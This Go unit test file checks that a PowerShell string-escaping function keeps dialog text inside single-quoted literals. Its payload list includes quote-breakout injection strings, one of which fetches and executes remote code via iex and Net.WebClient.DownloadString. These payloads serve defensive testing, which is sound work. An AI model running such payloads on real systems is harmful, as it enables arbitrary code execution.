package dialogs

import (
	"strings"
	"testing"
)

// escapePS is the last place a dialog interpolates frontend text into a script
// (message boxes and pickers moved to direct Win32 calls), and it had no tests. The
// prompt's title, message and default value all pass through it into single-quoted
// PowerShell string literals.
//
// The contract: inside a SINGLE-quoted PowerShell string nothing expands — `$`,
// backtick and `@` are all literal — so closing the quote is the only way out, and
// `''` is the escape for it. That makes doubling quotes necessary and sufficient.

// escaped returns the value as it would appear inside '...' in the generated script.
func escaped(v string) string { return "'" + escapePS(v) + "'" }

// quotesBalanced walks a single-quoted PowerShell literal and reports whether it ends
// exactly where it should — i.e. the payload never terminated the string early. `”`
// inside the literal is an escaped quote, not a terminator.
func quotesBalanced(literal string) bool {
	if !strings.HasPrefix(literal, "'") {
		return false
	}
	i := 1
	for i < len(literal) {
		if literal[i] != '\'' {
			i++
			continue
		}
		// A doubled quote is an escaped quote: skip both and continue inside.
		if i+1 < len(literal) && literal[i+1] == '\'' {
			i += 2
			continue
		}
		// A lone quote closes the literal — it must be the final character.
		return i == len(literal)-1
	}
	return false // ran off the end with the string still open
}

func TestEscapePSKeepsPayloadsInsideTheStringLiteral(t *testing.T) {
	// Each of these tries to break out of the literal and append code.
	payloads := []string{
		`'; Start-Process calc; '`,
		`' ; iex (New-Object Net.WebClient).DownloadString('http://x') ; '`,
		`'`,
		`''`,
		`'''`,
		`don't`,
		`a'b'c`,
		// These matter only in double-quoted strings; they must survive as literals
		// here, and must not be mistaken for something needing escaping.
		"$(Start-Process calc)",
		"${env:PATH}",
		"$env:USERNAME",
		"`n`r`t",
		"`$(calc)",
		"@(1,2,3)",
		"a`\"b",
		// Line handling.
		"line1\nline2",
		"line1\r\nline2",
		"line1\rline2",
		// Awkward but legitimate.
		"", "   ", "unicode ✅ 日本語", strings.Repeat("'", 40),
	}

	for _, p := range payloads {
		lit := escaped(p)
		if !quotesBalanced(lit) {
			t.Errorf("payload %q escaped to %s, which does not stay inside one literal", p, lit)
		}
	}
}

func TestEscapePSDoublesQuotesAndNothingElse(t *testing.T) {
	// The only transformation on quotes.
	if got, want := escapePS(`it's`), `it''s`; got != want {
		t.Errorf("escapePS(`it's`) = %q, want %q", got, want)
	}
	// A single-quoted PS string does not expand these, so they must pass through
	// untouched — altering them would corrupt the message the user reads.
	for _, v := range []string{"$var", "$(cmd)", "`n", "`", "@{}", `\`, `"`, "%PATH%"} {
		if got := escapePS(v); got != v {
			t.Errorf("escapePS(%q) = %q — a single-quoted literal needs no escaping here", v, got)
		}
	}
}

// The previous implementation replaced newlines with a backtick-n escape, which is
// only meaningful in a DOUBLE-quoted string. Inside single quotes it is literal, so
// every newline reached the dialog as the two characters `n.
func TestEscapePSKeepsRealNewlines(t *testing.T) {
	got := escapePS("first\nsecond")
	if strings.Contains(got, "`n") {
		t.Errorf("newline became a literal backtick-n (%q); inside '...' that is shown verbatim", got)
	}
	if !strings.Contains(got, "\n") {
		t.Errorf("the newline was dropped entirely: %q", got)
	}
	// CRLF normalises to one newline rather than doubling the line break.
	if got, want := escapePS("a\r\nb"), "a\nb"; got != want {
		t.Errorf("escapePS(\"a\\r\\nb\") = %q, want %q", got, want)
	}
	// A bare CR also becomes a newline rather than being dropped.
	if got, want := escapePS("a\rb"), "a\nb"; got != want {
		t.Errorf("escapePS(\"a\\rb\") = %q, want %q", got, want)
	}
}
